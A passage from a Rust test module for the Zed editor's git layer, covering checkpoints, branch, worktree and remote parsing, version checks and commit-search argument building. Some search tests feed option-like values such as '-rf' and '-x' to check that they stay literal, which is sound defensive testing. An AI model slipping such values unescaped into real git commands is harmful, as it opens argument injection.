        trust_if_hooks_cannot_be_disabled(&repo);

        // initial commit
        repo.stage_paths(vec![repo_path("main.rs")], Arc::new(HashMap::default()))
            .await
            .unwrap();
        repo.commit(
            "Initial commit".into(),
            None,
            CommitOptions::default(),
            AskPassDelegate::new(&mut cx.to_async(), |_, _, _| {}),
            Arc::new(test_commit_envs()),
        )
        .await
        .unwrap();

        let checkpoint = repo.checkpoint().await.unwrap();

        smol::fs::write(&text_path, "fn main() { println!(\"Modified\"); }")
            .await
            .unwrap();
        smol::fs::write(&bin_path, "Modified binary file")
            .await
            .unwrap();

        repo.restore_checkpoint(checkpoint).await.unwrap();

        // Text files should be restored to checkpoint state,
        // but binaries should not (they aren't tracked)
        assert_eq!(
            smol::fs::read_to_string(&text_path).await.unwrap(),
            "fn main() {}"
        );

        assert_eq!(
            smol::fs::read_to_string(&bin_path).await.unwrap(),
            "Modified binary file"
        );
    }

    #[test]
    fn test_branches_parsing() {
        // suppress "help: octal escapes are not supported, `\0` is always null"
        #[allow(clippy::octal_escapes)]
        let input = "*\0060964da10574cd9bf06463a53bf6e0769c5c45e\0\0refs/heads/zed-patches\0refs/remotes/origin/zed-patches\0\01733187470\0John Doe\0generated protobuf\n";
        assert_eq!(
            parse_branch_input(input, None).unwrap(),
            vec![Branch {
                is_head: true,
                ref_name: "refs/heads/zed-patches".into(),
                upstream: Some(Upstream {
                    ref_name: "refs/remotes/origin/zed-patches".into(),
                    tracking: UpstreamTracking::Tracked(UpstreamTrackingStatus {
                        ahead: 0,
                        behind: 0
                    })
                }),
                most_recent_commit: Some(CommitSummary {
                    sha: "060964da10574cd9bf06463a53bf6e0769c5c45e".into(),
                    subject: "generated protobuf".into(),
                    commit_timestamp: 1733187470,
                    author_name: SharedString::new_static("John Doe"),
                    has_parent: false,
                })
            }]
        )
    }

    #[test]
    fn test_branches_parsing_containing_refs_with_missing_fields() {
        #[allow(clippy::octal_escapes)]
        let input = " \090012116c03db04344ab10d50348553aa94f1ea0\0refs/heads/broken\n \0eb0cae33272689bd11030822939dd2701c52f81e\0895951d681e5561478c0acdd6905e8aacdfd2249\0refs/heads/dev\0\0\01762948725\0Zed\0Add feature\n*\0895951d681e5561478c0acdd6905e8aacdfd2249\0\0refs/heads/main\0\0\01762948695\0Zed\0Initial commit\n";

        let branches = parse_branch_input(input, None).unwrap();
        assert_eq!(branches.len(), 2);
        assert_eq!(
            branches,
            vec![
                Branch {
                    is_head: false,
                    ref_name: "refs/heads/dev".into(),
                    upstream: None,
                    most_recent_commit: Some(CommitSummary {
                        sha: "eb0cae33272689bd11030822939dd2701c52f81e".into(),
                        subject: "Add feature".into(),
                        commit_timestamp: 1762948725,
                        author_name: SharedString::new_static("Zed"),
                        has_parent: true,
                    })
                },
                Branch {
                    is_head: true,
                    ref_name: "refs/heads/main".into(),
                    upstream: None,
                    most_recent_commit: Some(CommitSummary {
                        sha: "895951d681e5561478c0acdd6905e8aacdfd2249".into(),
                        subject: "Initial commit".into(),
                        commit_timestamp: 1762948695,
                        author_name: SharedString::new_static("Zed"),
                        has_parent: false,
                    })
                }
            ]
        )
    }

    #[test]
    fn test_upstream_branch_name() {
        let upstream = Upstream {
            ref_name: "refs/remotes/origin/feature/branch".into(),
            tracking: UpstreamTracking::Tracked(UpstreamTrackingStatus {
                ahead: 0,
                behind: 0,
            }),
        };
        assert_eq!(upstream.branch_name(), Some("feature/branch"));

        let upstream = Upstream {
            ref_name: "refs/remotes/upstream/main".into(),
            tracking: UpstreamTracking::Tracked(UpstreamTrackingStatus {
                ahead: 0,
                behind: 0,
            }),
        };
        assert_eq!(upstream.branch_name(), Some("main"));

        let upstream = Upstream {
            ref_name: "refs/heads/local".into(),
            tracking: UpstreamTracking::Tracked(UpstreamTrackingStatus {
                ahead: 0,
                behind: 0,
            }),
        };
        assert_eq!(upstream.branch_name(), None);

        // Test case where upstream branch name differs from what might be the local branch name
        let upstream = Upstream {
            ref_name: "refs/remotes/origin/feature/git-pull-request".into(),
            tracking: UpstreamTracking::Tracked(UpstreamTrackingStatus {
                ahead: 0,
                behind: 0,
            }),
        };
        assert_eq!(upstream.branch_name(), Some("feature/git-pull-request"));
    }

    #[test]
    fn test_parse_worktrees_from_str() {
        // Empty input
        let result = parse_worktrees_from_str("", None);
        assert!(result.is_empty());

        // Single worktree (main)
        let input = "worktree /home/user/project\nHEAD abc123def\nbranch refs/heads/main\n\n";
        let result = parse_worktrees_from_str(input, Some(Path::new("/home/user/project")));
        assert_eq!(result.len(), 1);
        assert_eq!(result[0].path, PathBuf::from("/home/user/project"));
        assert_eq!(result[0].sha.as_ref(), "abc123def");
        assert_eq!(result[0].ref_name, Some("refs/heads/main".into()));
        assert!(result[0].is_main);
        assert!(!result[0].is_bare);

        // Multiple worktrees
        let input = "worktree /home/user/project-wt\nHEAD def456\nbranch refs/heads/feature\n\n\
                      worktree /home/user/project\nHEAD abc123\nbranch refs/heads/main\n\n";
        let result = parse_worktrees_from_str(input, Some(Path::new("/home/user/project")));
        assert_eq!(result.len(), 2);
        assert_eq!(result[0].path, PathBuf::from("/home/user/project-wt"));
        assert_eq!(result[0].ref_name, Some("refs/heads/feature".into()));
        assert!(!result[0].is_main);
        assert!(!result[0].is_bare);
        assert_eq!(result[1].path, PathBuf::from("/home/user/project"));
        assert_eq!(result[1].ref_name, Some("refs/heads/main".into()));
        assert!(result[1].is_main);
        assert!(!result[1].is_bare);

        // Detached HEAD entry (included with ref_name: None)
        let input = "worktree /home/user/project\nHEAD abc123\nbranch refs/heads/main\n\n\
                      worktree /home/user/detached\nHEAD def456\ndetached\n\n";
        let result = parse_worktrees_from_str(input, Some(Path::new("/home/user/project")));
        assert_eq!(result.len(), 2);
        assert_eq!(result[0].path, PathBuf::from("/home/user/project"));
        assert_eq!(result[0].ref_name, Some("refs/heads/main".into()));
        assert!(result[0].is_main);
        assert_eq!(result[1].path, PathBuf::from("/home/user/detached"));
        assert_eq!(result[1].ref_name, None);
        assert_eq!(result[1].sha.as_ref(), "def456");
        assert!(!result[1].is_main);
        assert!(!result[1].is_bare);

        // Bare repo entry with no main worktree.
        let input = "worktree /home/user/bare.git\nHEAD abc123\nbare\n\n\
                      worktree /home/user/project\nHEAD def456\nbranch refs/heads/main\n\n";
        let result = parse_worktrees_from_str(input, None);
        assert_eq!(result.len(), 2);
        assert_eq!(result[0].path, PathBuf::from("/home/user/bare.git"));
        assert_eq!(result[0].ref_name, None);
        assert!(!result[0].is_main);
        assert!(result[0].is_bare);
        assert_eq!(result[1].path, PathBuf::from("/home/user/project"));
        assert_eq!(result[1].ref_name, Some("refs/heads/main".into()));
        assert!(!result[1].is_main);
        assert!(!result[1].is_bare);

        // Extra porcelain lines (locked, prunable) should be ignored
        let input = "worktree /home/user/project\nHEAD abc123\nbranch refs/heads/main\n\n\
                      worktree /home/user/locked-wt\nHEAD def456\nbranch refs/heads/locked-branch\nlocked\n\n\
                      worktree /home/user/prunable-wt\nHEAD 789aaa\nbranch refs/heads/prunable-branch\nprunable\n\n";
        let result = parse_worktrees_from_str(input, Some(Path::new("/home/user/project")));
        assert_eq!(result.len(), 3);
        assert_eq!(result[0].path, PathBuf::from("/home/user/project"));
        assert_eq!(result[0].ref_name, Some("refs/heads/main".into()));
        assert!(result[0].is_main);
        assert_eq!(result[1].path, PathBuf::from("/home/user/locked-wt"));
        assert_eq!(result[1].ref_name, Some("refs/heads/locked-branch".into()));
        assert!(!result[1].is_main);
        assert_eq!(result[2].path, PathBuf::from("/home/user/prunable-wt"));
        assert_eq!(
            result[2].ref_name,
            Some("refs/heads/prunable-branch".into())
        );
        assert!(!result[2].is_main);

        // Leading/trailing whitespace on lines should be tolerated
        let input =
            "  worktree /home/user/project  \n  HEAD abc123  \n  branch refs/heads/main  \n\n";
        let result = parse_worktrees_from_str(input, Some(Path::new("/home/user/project")));
        assert_eq!(result.len(), 1);
        assert_eq!(result[0].path, PathBuf::from("/home/user/project"));
        assert_eq!(result[0].sha.as_ref(), "abc123");
        assert_eq!(result[0].ref_name, Some("refs/heads/main".into()));
        assert!(result[0].is_main);

        // Windows-style line endings should be handled
        let input = "worktree /home/user/project\r\nHEAD abc123\r\nbranch refs/heads/main\r\n\r\n";
        let result = parse_worktrees_from_str(input, Some(Path::new("/home/user/project")));
        assert_eq!(result.len(), 1);
        assert_eq!(result[0].path, PathBuf::from("/home/user/project"));
        assert_eq!(result[0].sha.as_ref(), "abc123");
        assert_eq!(result[0].ref_name, Some("refs/heads/main".into()));
        assert!(result[0].is_main);
    }

    #[gpui::test]
    async fn test_create_and_list_worktrees(cx: &mut TestAppContext) {
        // Older git is covered by `test_worktrees_on_installed_git`.
        if !installed_git_supports(GitFeature::WorktreeList) {
            return;
        }
        disable_git_global_config();
        cx.executor().allow_parking();

        let temp_dir = tempfile::tempdir().unwrap();
        let repo_dir = temp_dir.path().join("repo");
        let worktrees_dir = temp_dir.path().join("worktrees");

        fs::create_dir_all(&repo_dir).unwrap();
        fs::create_dir_all(&worktrees_dir).unwrap();

        git_init_repo(&repo_dir);

        let repo = RealGitRepository::new(
            &repo_dir.join(".git"),
            None,
            Some("git".into()),
            cx.executor(),
        )
        .unwrap();
        trust_if_hooks_cannot_be_disabled(&repo);

        // Create an initial commit (required for worktrees)
        smol::fs::write(repo_dir.join("file.txt"), "content")
            .await
            .unwrap();
        repo.stage_paths(vec![repo_path("file.txt")], Arc::new(HashMap::default()))
            .await
            .unwrap();
        repo.commit(
            "Initial commit".into(),
            None,
            CommitOptions::default(),
            AskPassDelegate::new(&mut cx.to_async(), |_, _, _| {}),
            Arc::new(test_commit_envs()),
        )
        .await
        .unwrap();

        // List worktrees — should have just the main one
        let worktrees = repo.worktrees().await.unwrap();
        assert_eq!(worktrees.len(), 1);
        assert_eq!(
            worktrees[0].path.canonicalize().unwrap(),
            repo_dir.canonicalize().unwrap()
        );

        let worktree_path = worktrees_dir.join("some-worktree");

        // Create a new worktree
        repo.create_worktree(
            CreateWorktreeTarget::NewBranch {
                branch_name: "test-branch".to_string(),
                base_sha: Some("HEAD".to_string()),
            },
            worktree_path.clone(),
        )
        .await
        .unwrap();

        // List worktrees — should have two
        let worktrees = repo.worktrees().await.unwrap();
        assert_eq!(worktrees.len(), 2);

        let new_worktree = worktrees
            .iter()
            .find(|w| w.display_name() == "test-branch")
            .expect("should find worktree with test-branch");
        assert_eq!(
            new_worktree.path.canonicalize().unwrap(),
            worktree_path.canonicalize().unwrap(),
        );

        // The new worktree's git metadata directory should report a creation
        // time, resolved via the worktree's `.git` file.
        let created_at = repo
            .worktree_created_at(worktree_path.clone())
            .await
            .unwrap();
        assert!(
            created_at.is_some(),
            "creation time should be available for a freshly created worktree"
        );

        // A path with no worktree at all reports `None`.
        let missing = repo
            .worktree_created_at(worktrees_dir.join("does-not-exist"))
            .await
            .unwrap();
        assert_eq!(missing, None);
    }

    #[gpui::test]
    async fn test_remove_worktree(cx: &mut TestAppContext) {
        if !installed_git_supports(GitFeature::WorktreeRemove) {
            return;
        }
        disable_git_global_config();
        cx.executor().allow_parking();

        let temp_dir = tempfile::tempdir().unwrap();
        let repo_dir = temp_dir.path().join("repo");
        let worktrees_dir = temp_dir.path().join("worktrees");
        git_init_repo(&repo_dir);

        let repo = RealGitRepository::new(
            &repo_dir.join(".git"),
            None,
            Some("git".into()),
            cx.executor(),
        )
        .unwrap();
        trust_if_hooks_cannot_be_disabled(&repo);

        // Create an initial commit
        smol::fs::write(repo_dir.join("file.txt"), "content")
            .await
            .unwrap();
        repo.stage_paths(vec![repo_path("file.txt")], Arc::new(HashMap::default()))
            .await
            .unwrap();
        repo.commit(
            "Initial commit".into(),
            None,
            CommitOptions::default(),
            AskPassDelegate::new(&mut cx.to_async(), |_, _, _| {}),
            Arc::new(test_commit_envs()),
        )
        .await
        .unwrap();

        // Create a worktree
        let worktree_path = worktrees_dir.join("worktree-to-remove");
        repo.create_worktree(
            CreateWorktreeTarget::NewBranch {
                branch_name: "to-remove".to_string(),
                base_sha: Some("HEAD".to_string()),
            },
            worktree_path.clone(),
        )
        .await
        .unwrap();

        // Remove the worktree
        repo.remove_worktree(worktree_path.clone(), false)
            .await
            .unwrap();

        // Verify the directory is removed
        let worktrees = repo.worktrees().await.unwrap();
        assert_eq!(worktrees.len(), 1);
        assert!(
            worktrees.iter().all(|w| w.display_name() != "to-remove"),
            "removed worktree should not appear in list"
        );
        assert!(!worktree_path.exists());

        // Create a worktree
        let worktree_path = worktrees_dir.join("dirty-wt");
        repo.create_worktree(
            CreateWorktreeTarget::NewBranch {
                branch_name: "dirty-wt".to_string(),
                base_sha: Some("HEAD".to_string()),
            },
            worktree_path.clone(),
        )
        .await
        .unwrap();

        assert!(worktree_path.exists());

        // Add uncommitted changes in the worktree
        smol::fs::write(worktree_path.join("dirty-file.txt"), "uncommitted")
            .await
            .unwrap();

        // Non-force removal should fail with dirty worktree
        let result = repo.remove_worktree(worktree_path.clone(), false).await;
        assert!(
            result.is_err(),
            "non-force removal of dirty worktree should fail"
        );

        // Force removal should succeed
        repo.remove_worktree(worktree_path.clone(), true)
            .await
            .unwrap();

        let worktrees = repo.worktrees().await.unwrap();
        assert_eq!(worktrees.len(), 1);
        assert!(!worktree_path.exists());
    }

    #[gpui::test]
    async fn test_rename_worktree(cx: &mut TestAppContext) {
        if !installed_git_supports(GitFeature::WorktreeRemove) {
            return;
        }
        disable_git_global_config();
        cx.executor().allow_parking();

        let temp_dir = tempfile::tempdir().unwrap();
        let repo_dir = temp_dir.path().join("repo");
        let worktrees_dir = temp_dir.path().join("worktrees");

        git_init_repo(&repo_dir);

        let repo = RealGitRepository::new(
            &repo_dir.join(".git"),
            None,
            Some("git".into()),
            cx.executor(),
        )
        .unwrap();
        trust_if_hooks_cannot_be_disabled(&repo);

        // Create an initial commit
        smol::fs::write(repo_dir.join("file.txt"), "content")
            .await
            .unwrap();
        repo.stage_paths(vec![repo_path("file.txt")], Arc::new(HashMap::default()))
            .await
            .unwrap();
        repo.commit(
            "Initial commit".into(),
            None,
            CommitOptions::default(),
            AskPassDelegate::new(&mut cx.to_async(), |_, _, _| {}),
            Arc::new(test_commit_envs()),
        )
        .await
        .unwrap();

        // Create a worktree
        let old_path = worktrees_dir.join("old-worktree-name");
        repo.create_worktree(
            CreateWorktreeTarget::NewBranch {
                branch_name: "old-name".to_string(),
                base_sha: Some("HEAD".to_string()),
            },
            old_path.clone(),
        )
        .await
        .unwrap();

        assert!(old_path.exists());

        // Move the worktree to a new path
        let new_path = worktrees_dir.join("new-worktree-name");
        repo.rename_worktree(old_path.clone(), new_path.clone())
            .await
            .unwrap();

        // Verify the old path is gone and new path exists
        assert!(!old_path.exists());
        assert!(new_path.exists());

        // Verify it shows up in worktree list at the new path
        let worktrees = repo.worktrees().await.unwrap();
        assert_eq!(worktrees.len(), 2);
        let moved_worktree = worktrees
            .iter()
            .find(|w| w.display_name() == "old-name")
            .expect("should find worktree by branch name");
        assert_eq!(
            moved_worktree.path.canonicalize().unwrap(),
            new_path.canonicalize().unwrap()
        );
    }

    #[gpui::test]
    async fn test_initial_graph_data_ref_set(cx: &mut TestAppContext) {
        disable_git_global_config();
        cx.executor().allow_parking();

        let repo_dir = tempfile::tempdir().unwrap();
        git_init_repo(repo_dir.path());

        let repo = RealGitRepository::new(
            &repo_dir.path().join(".git"),
            None,
            Some("git".into()),
            cx.executor(),
        )
        .unwrap();
        trust_if_hooks_cannot_be_disabled(&repo);
        let git = repo.git_binary();

        let graph_commits = async || {
            let (tx, rx) = smol::channel::unbounded();
            repo.initial_graph_data(LogSource::All, LogOrder::DateOrder, tx)
                .await
                .unwrap();
            let mut commits = std::collections::HashSet::new();
            while let Ok(chunk) = rx.try_recv() {
                for commit in chunk {
                    commits.insert(commit.sha);
                }
            }
            commits
        };

        smol::fs::write(repo_dir.path().join("file1"), "1")
            .await
            .unwrap();
        let branch_sha = repo.checkpoint().await.unwrap().commit_sha;
        repo.update_ref("refs/heads/main".into(), branch_sha.to_string())
            .await
            .unwrap();

        smol::fs::write(repo_dir.path().join("file2"), "2")
            .await
            .unwrap();
        let hidden_sha = repo.checkpoint().await.unwrap().commit_sha;
        repo.update_ref("refs/custom/hidden".into(), hidden_sha.to_string())
            .await
            .unwrap();

        let graph = graph_commits().await;
        assert!(graph.contains(&branch_sha));
        assert!(!graph.contains(&hidden_sha));

        git.build_command(&["update-ref", "--no-deref", "HEAD", &hidden_sha.to_string()])
            .await
            .output()
            .await
            .unwrap();

        let graph = graph_commits().await;
        assert!(graph.contains(&branch_sha));
        assert!(graph.contains(&hidden_sha));
    }

    #[gpui::test]
    async fn test_check_for_pushed_commit(cx: &mut TestAppContext) {
        disable_git_global_config();
        cx.executor().allow_parking();

        let temp_dir = tempfile::tempdir().unwrap();
        let repo_dir = temp_dir.path().join("repo");
        git_init_repo(&repo_dir);

        let repo = RealGitRepository::new(
            &repo_dir.join(".git"),
            None,
            Some("git".into()),
            cx.executor(),
        )
        .unwrap();
        trust_if_hooks_cannot_be_disabled(&repo);

        // New repo doesn't have any commits yet
        assert!(repo.check_for_pushed_commit().await.unwrap().is_empty());

        git_command(
            &repo_dir,
            ["commit", "--allow-empty", "-m", "Initial commit"],
        );

        // No remote branches exist yet
        assert!(repo.check_for_pushed_commit().await.unwrap().is_empty());

        // Create simulated remote branches
        git_command(
            &repo_dir,
            ["update-ref", "refs/remotes/origin/main", "HEAD"],
        );
        git_command(
            &repo_dir,
            ["update-ref", "refs/remotes/origin/other-branch", "HEAD"],
        );
        assert_eq!(
            repo.check_for_pushed_commit().await.unwrap(),
            vec![
                SharedString::from("origin/main"),
                SharedString::from("origin/other-branch")
            ]
        );

        // Switch to a new branch, commit but do not push
        git_command(&repo_dir, ["checkout", "-b", "local-feature"]);
        git_command(&repo_dir, ["commit", "--allow-empty", "-m", "Local commit"]);

        // New commit has not been pushed
        assert!(repo.check_for_pushed_commit().await.unwrap().is_empty());
    }

    #[test]
    fn test_original_repo_path_from_common_dir() {
        // Normal repo: common_dir is <work_dir>/.git
        assert_eq!(
            original_repo_path_from_common_dir(Path::new("/code/zed5/.git")),
            Some(PathBuf::from("/code/zed5"))
        );

        // Worktree: common_dir is the main repo's .git
        // (same result — that's the point, it always traces back to the original)
        assert_eq!(
            original_repo_path_from_common_dir(Path::new("/code/zed5/.git")),
            Some(PathBuf::from("/code/zed5"))
        );

        // Bare repo: no .git suffix, returns None (no working-tree root)
        assert_eq!(
            original_repo_path_from_common_dir(Path::new("/code/zed5.git")),
            None
        );

        // Root-level .git directory
        assert_eq!(
            original_repo_path_from_common_dir(Path::new("/.git")),
            Some(PathBuf::from("/"))
        );
    }

    #[gpui::test]
    async fn test_default_branch(cx: &mut TestAppContext) {
        disable_git_global_config();
        cx.executor().allow_parking();

        let repo_dir = tempfile::tempdir().unwrap();
        git_init_repo(repo_dir.path());

        let repo = RealGitRepository::new(
            &repo_dir.path().join(".git"),
            None,
            Some("git".into()),
            cx.executor(),
        )
        .unwrap();
        trust_if_hooks_cannot_be_disabled(&repo);

        assert_eq!(repo.default_branch(false).await.unwrap(), None);

        git_command(
            repo_dir.path(),
            ["commit", "--allow-empty", "-m", "Initial commit"],
        );

        assert_eq!(
            repo.default_branch(false).await.unwrap(),
            Some("main".into())
        );

        git_command(
            repo_dir.path(),
            ["update-ref", "refs/remotes/origin/main", "HEAD"],
        );
        git_command(
            repo_dir.path(),
            [
                "symbolic-ref",
                "refs/remotes/origin/HEAD",
                "refs/remotes/origin/main",
            ],
        );

        assert_eq!(
            repo.default_branch(false).await.unwrap(),
            Some("main".into())
        );
        assert_eq!(
            repo.default_branch(true).await.unwrap(),
            Some("origin/main".into())
        );
    }

    impl RealGitRepository {
        /// Force a Git garbage collection on the repository.
        fn gc(&self) -> BoxFuture<'_, Result<()>> {
            let working_directory = self.command_directory();
            let git_directory = self.path();
            let git_binary_path = self.any_git_binary_path.clone();
            let executor = self.executor.clone();
            self.executor
                .spawn(async move {
                    let git_binary_path = git_binary_path.clone();
                    let git = GitBinary::new(
                        git_binary_path,
                        working_directory,
                        git_directory,
                        executor,
                        true,
                    );
                    git.run(&["gc", "--prune"]).await?;
                    Ok(())
                })
                .boxed()
        }
    }

    #[test]
    fn test_parse_remote_urls() {
        let stdout = concat!(
            "origin\thttps://github.com/zed-industries/zed.git (fetch) [blob:none]\n",
            "origin\thttps://github.com/zed-industries/zed.git (push)\n",
            "upstream\t/Users/user/My Projects/upstream.git (fetch)\n",
            "upstream\t/Users/user/My Projects/upstream.git (push)\n",
            "a\t/x (fetch) dir (fetch)\n",
            "a\t/x (fetch) dir (push)\n",
            "archive\t/tmp/remote [archive].git (fetch)\n",
            "archive\t/tmp/remote [archive].git (push)\n",
        );

        let remote_urls = parse_remote_urls(stdout);
        assert_eq!(remote_urls.len(), 4);
        assert_eq!(
            remote_urls.get("origin").map(String::as_str),
            Some("https://github.com/zed-industries/zed.git")
        );
        assert_eq!(
            remote_urls.get("upstream").map(String::as_str),
            Some("/Users/user/My Projects/upstream.git")
        );
        assert_eq!(
            remote_urls.get("a").map(String::as_str),
            Some("/x (fetch) dir")
        );
        assert_eq!(
            remote_urls.get("archive").map(String::as_str),
            Some("/tmp/remote [archive].git")
        );
    }

    #[gpui::test]
    async fn test_remote_urls(cx: &mut TestAppContext) {
        disable_git_global_config();
        cx.executor().allow_parking();

        let temp_dir = tempfile::tempdir().unwrap();
        let repo_dir = temp_dir.path().join("repo");
        std::fs::create_dir_all(&repo_dir).unwrap();

        git_init_repo(&repo_dir);

        let repo = RealGitRepository::new(
            &repo_dir.join(".git"),
            None,
            Some("git".into()),
            cx.executor(),
        )
        .unwrap();
        trust_if_hooks_cannot_be_disabled(&repo);

        let git = repo.git_binary();
        git.run(&[
            "remote",
            "add",
            "origin",
            "https://github.com/zed-industries/zed.git",
        ])
        .await
        .unwrap();
        git.run(&[
            "remote",
            "add",
            "upstream",
            "/Users/user/My Projects/upstream.git",
        ])
        .await
        .unwrap();
        git.run(&["config", "remote.origin.promisor", "true"])
            .await
            .unwrap();
        git.run(&["config", "remote.origin.partialclonefilter", "blob:none"])
            .await
            .unwrap();

        let remote_urls = repo.remote_urls().await;
        assert_eq!(remote_urls.len(), 2);
        assert_eq!(
            remote_urls.get("origin").unwrap(),
            "https://github.com/zed-industries/zed.git"
        );
        assert_eq!(
            remote_urls.get("upstream").unwrap(),
            "/Users/user/My Projects/upstream.git"
        );
    }

    fn version(major: u32, minor: u32, patch: u32) -> Option<GitVersion> {
        Some(GitVersion::new(major, minor, patch))
    }

    fn strings(values: &[&str]) -> Vec<String> {
        values.iter().map(|value| value.to_string()).collect()
    }

    #[test]
    fn test_git_feature_requirements() {
        assert!(GitFeature::StashStaged.is_supported_by(None));
        assert!(GitFeature::StashStaged.is_supported_by(version(2, 35, 0)));
        assert!(!GitFeature::StashStaged.is_supported_by(version(2, 34, 9)));
        assert!(GitFeature::UnixDateFormat.is_supported_by(version(2, 9, 4)));
        assert!(!GitFeature::UnixDateFormat.is_supported_by(version(2, 9, 3)));

        let error = GitFeature::WorktreeRemove
            .require(version(2, 7, 4), "Remove worktree")
            .expect_err("git 2.7 has no `git worktree remove`");
        assert_eq!(
            error.to_string(),
            "\"Remove worktree\" needs git 2.17.0 or later (this git is 2.7.4)."
        );
        GitFeature::WorktreeRemove
            .require(version(2, 17, 0), "Remove worktree")
            .unwrap();
        GitFeature::WorktreeRemove
            .require(None, "Remove worktree")
            .unwrap();
    }

    #[test]
    fn test_author_filter_refuses_an_empty_author() {
        let args = |authors: &[&str]| SearchCommitArgs {
            authors: authors
                .iter()
                .map(|author| SharedString::from(*author))
                .collect(),
            ..SearchCommitArgs::default()
        };
        assert!(args(&[]).author_filters().unwrap().is_empty());
        assert_eq!(
            args(&["  山田 太郎 ", "yamada"]).author_filters().unwrap(),
            ["山田 太郎", "yamada"]
        );
        // `--author=` matches every commit, so this may not come back as "no author filter".
        for empty in ["", " ", "\t\n", "　"] {
            assert!(
                args(&["山田", empty]).author_filters().is_err(),
                "an author of {empty:?} would widen the search to every commit"
            );
            assert!(args(&[empty]).validate().is_err());
        }
    }

    #[test]
    fn test_filters_an_older_server_would_drop() {
        let plain = SearchCommitArgs {
            query: "直した".into(),
            authors: vec!["山田".into()],
            case_sensitive: true,
            ..SearchCommitArgs::default()
        };
        assert!(!plain.uses_filters_beyond_author());
        assert!(!SearchCommitArgs::default().uses_filters_beyond_author());

        let edits: [(&str, &dyn Fn(&mut SearchCommitArgs)); 9] = [
            ("a second author", &|args| {
                args.authors.push("yamada".into())
            }),
            ("tagged commits", &|args| args.commits = Some(Vec::new())),
            ("a branch", &|args| {
                args.branch = Some("refs/heads/feature".into())
            }),
            ("a path", &|args| args.path = Some("src".into())),
            ("a start date", &|args| args.since = Some(0)),
            ("an end date", &|args| args.until = Some(0)),
            ("changed text", &|args| args.change = Some("x".into())),
            ("a merge filter", &|args| args.merges = MergeFilter::Only),
            ("a sha prefix", &|args| {
                args.sha_prefix = Some("abcd".into())
            }),
        ];
        for (name, edit) in edits {
            let mut args = plain.clone();
            edit(&mut args);
            assert!(
                args.uses_filters_beyond_author(),
                "{name} must not be sent to a server that would drop it"
            );
        }
    }

    #[test]
    fn test_commit_search_log_args() {
        let all = || vec!["--branches".to_string(), "HEAD".to_string()];
        let build = |args: SearchCommitArgs| {
            commit_search_log_args(&args, all(), Some(GitVersion::new(2, 47, 0)))
                .unwrap()
                .unwrap_or_default()
        };

        assert!(
            commit_search_log_args(&SearchCommitArgs::default(), all(), None)
                .unwrap()
                .is_none(),
            "nothing to match on finds nothing rather than walking the whole history"
        );
        assert_eq!(
            build(SearchCommitArgs {
                query: "fix: typo".into(),
                ..SearchCommitArgs::default()
            }),
            [
                "--fixed-strings",
                "--regexp-ignore-case",
                "--grep=fix: typo",
                "--branches",
                "HEAD",
                "--"
            ]
        );
        assert_eq!(
            build(SearchCommitArgs {
                query: "abcdef1".into(),
                authors: vec!["山田".into(), "-x".into()],
                case_sensitive: true,
                ..SearchCommitArgs::default()
            }),
            [
                "--fixed-strings",
                "--author=山田",
                "--author=-x",
                "--branches",
                "HEAD",
                "--"
            ],
            "a hex query is a sha prefix, filtered afterwards, not a --grep"
        );
        assert_eq!(
            build(SearchCommitArgs {
                query: "abcdef1".into(),
                sha_prefix: Some("1234".into()),
                ..SearchCommitArgs::default()
            }),
            [
                "--fixed-strings",
                "--regexp-ignore-case",
                "--grep=abcdef1",
                "--branches",
                "HEAD",
                "--"
            ],
            "with a sha: condition the hex text is message text again"
        );
        assert_eq!(
            build(SearchCommitArgs {
                change: Some("a.B".into()),
                since: Some(0),
                until: Some(1_788_220_800),
                merges: MergeFilter::Exclude,
                path: Some("./src/*.rs".into()),
                ..SearchCommitArgs::default()
            }),
            [
                "-G[aA]\\.[bB]",
                "--since=1970-01-01 00:00:00 +0000",
                "--until=2026-09-01 00:00:00 +0000",
                "--no-merges",
                "--branches",
                "HEAD",
                "--",
                ":(glob)src/*.rs"
            ]
        );
        assert_eq!(
            build(SearchCommitArgs {
                merges: MergeFilter::Only,
                path: Some("-rf".into()),
                ..SearchCommitArgs::default()
            }),
            ["--merges", "--branches", "HEAD", "--", ":(literal)-rf"]
        );
        assert_eq!(
            commit_search_log_args(
                &SearchCommitArgs {
                    merges: MergeFilter::Only,
                    path: Some("src".into()),
                    ..SearchCommitArgs::default()
                },
                vec!["docs/rewrite".into(), "--".into()],
                Some(GitVersion::new(2, 47, 0))
            )
            .unwrap()
            .unwrap_or_default(),
            ["--merges", "docs/rewrite", "--", ":(literal)src"],
            "a source's own terminator is not doubled, which would make it a pathspec"
        );
        assert!(
            commit_search_log_args(
                &SearchCommitArgs {
                    path: Some("a".into()),
                    ..SearchCommitArgs::default()
                },
                vec!["--follow".into(), "--".into(), "b".into()],
                None
            )
            .is_err(),
            "a file history already has its one pathspec"
        );
        assert!(
            commit_search_log_args(
                &SearchCommitArgs {
                    authors: vec![" ".into()],
                    ..SearchCommitArgs::default()
                },
                all(),
                None
            )
            .is_err()
        );

        let old_git = Some(GitVersion::new(1, 7, 3));
        let change = SearchCommitArgs {
            change: Some("x".into()),
            ..SearchCommitArgs::default()
        };
        let error = commit_search_log_args(&change, all(), old_git).unwrap_err();
        assert!(
            error
                .to_string()
                .starts_with("\"Search by changed text\" needs git 1.7.4 or later"),
            "{error}"
        );
        let path = SearchCommitArgs {
            path: Some("src".into()),
            ..SearchCommitArgs::default()
        };
        assert!(commit_search_log_args(&path, all(), Some(GitVersion::new(1, 8, 5))).is_err());
        assert!(commit_search_log_args(&path, all(), Some(GitVersion::new(1, 9, 0))).is_ok());
    }

    #[test]
    fn test_search_pathspec() {
        let pathspec = |path: &str| search_pathspec(path).unwrap();
        assert_eq!(pathspec("src/"), ":(literal)src/");
        assert_eq!(pathspec("./a b.txt"), ":(literal)a b.txt");
        assert_eq!(pathspec("/src"), ":(literal)src");
        assert_eq!(pathspec("[x].txt"), ":(literal)[x].txt");
        assert_eq!(pathspec("*.rs"), ":(glob)**/*.rs");
        assert_eq!(pathspec("src/**/*.rs"), ":(glob)src/**/*.rs");
        assert_eq!(pathspec("src\\lib.rs"), ":(literal)src/lib.rs");
        assert_eq!(pathspec("src\\*.rs"), ":(glob)src/*.rs");
        for whole_repository in ["/", "./", "\\", "."] {
            assert!(
                search_pathspec(whole_repository).is_err(),
                "{whole_repository:?} would search every file"
            );
        }
    }

    #[test]
    fn test_branch_search_revisions() {
        let refs = |names: &[&str]| {
            names
                .iter()
                .map(|name| name.to_string())
                .collect::<HashSet<_>>()
        };
        let existing = refs(&[
            "refs/heads/main",
            "refs/heads/feature",
            "refs/remotes/origin/main",
            "refs/remotes/origin/feature",
        ]);
        assert_eq!(
